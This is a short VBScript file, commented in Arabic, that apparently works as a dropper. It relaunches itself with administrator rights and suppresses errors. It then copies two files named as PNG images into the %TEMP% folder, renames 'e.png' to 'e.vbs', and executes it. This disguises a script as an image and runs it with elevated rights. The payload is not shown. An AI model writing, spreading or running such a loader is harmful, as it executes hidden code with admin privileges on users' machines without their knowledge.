If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
    WScript.Quit
End If

On Error Resume Next

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' تحديد مسار السكربت الحالي
Dim scriptPath
scriptPath = objFSO.GetParentFolderName(WScript.ScriptFullName)

' مسار مجلد pp داخل مسار السكربت
Dim ppSourceFolderPath
ppSourceFolderPath = scriptPath & "\pp"

' مسار ملف e.png داخل مجلد pp
Dim ePngFilePath
ePngFilePath = ppSourceFolderPath & "\e.png"

' مسار ملف p.png داخل مجلد pp
Dim pPngFilePath
pPngFilePath = ppSourceFolderPath & "\p.png"

' مسار مجلد %TEMP%
Dim tempFolderPath
tempFolderPath = objShell.ExpandEnvironmentStrings("%TEMP%")

' نسخ p.png إلى مجلد %TEMP% إذا لم يكن موجودًا
If objFSO.FileExists(pPngFilePath) And Not objFSO.FileExists(tempFolderPath & "\p.png") Then
    objFSO.CopyFile pPngFilePath, tempFolderPath & "\p.png"
End If

' نسخ e.png إلى مجلد %TEMP% وتغيير اسمه إلى e.vbs إذا لم يكن موجودًا
If objFSO.FileExists(ePngFilePath) And Not objFSO.FileExists(tempFolderPath & "\e.vbs") Then
    objFSO.CopyFile ePngFilePath, tempFolderPath & "\e.png"
    objFSO.MoveFile tempFolderPath & "\e.png", tempFolderPath & "\e.vbs"
End If

' تشغيل e.vbs
Dim eVbsFilePath
eVbsFilePath = tempFolderPath & "\e.vbs"
If objFSO.FileExists(eVbsFilePath) Then
    objShell.Run """" & eVbsFilePath & """", 1, False
End If
